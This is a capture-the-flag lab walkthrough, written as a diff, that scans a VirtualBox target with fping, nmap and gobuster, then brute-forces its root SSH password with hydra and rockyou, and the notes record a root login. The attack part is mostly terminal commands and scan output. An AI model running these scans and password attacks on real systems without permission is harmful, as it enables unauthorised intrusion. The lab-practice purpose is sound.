@@ -1,0 +1,59 @@
+-----------------------------------------------------------------------------------------------------
+fping -aqg 10.0.2.1/24
+-----------------------------------------------------------------------------------------------------
+Enumerate:
+-----------------------------------------------------------------------------------------------------
+┌──(root💀kali)-[/home/kali]
+└─# nmap -sS -v -p- -T4 10.0.2.68                                                                               2 ⚙
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-28 16:07 EDT
+Initiating ARP Ping Scan at 16:07
+Scanning 10.0.2.68 [1 port]
+Completed ARP Ping Scan at 16:07, 0.07s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 16:07
+Completed Parallel DNS resolution of 1 host. at 16:07, 0.01s elapsed
+Initiating SYN Stealth Scan at 16:07
+Scanning 10.0.2.68 [65535 ports]
+Discovered open port 80/tcp on 10.0.2.68
+Discovered open port 22/tcp on 10.0.2.68
+Completed SYN Stealth Scan at 16:07, 1.92s elapsed (65535 total ports)
+Nmap scan report for 10.0.2.68
+Host is up (0.00027s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:89:DA:9D (Oracle VirtualBox virtual NIC)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 2.21 seconds
+           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
+-----------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------
+┌──(root💀kali)-[/home/kali]
+└─# gobuster dir -u http://10.0.2.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.68
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              html,php,txt
+[+] Timeout:                 10s
+===============================================================
+2022/03/28 16:08:19 Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 57]
+------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------
+page source index.html:
+
+Dont Overthink. Really, Its simple.
+	<!-- Trust me -->
+
+hydra -l root -P <locate rockyou.txt>
+
+after this command --> logged as root
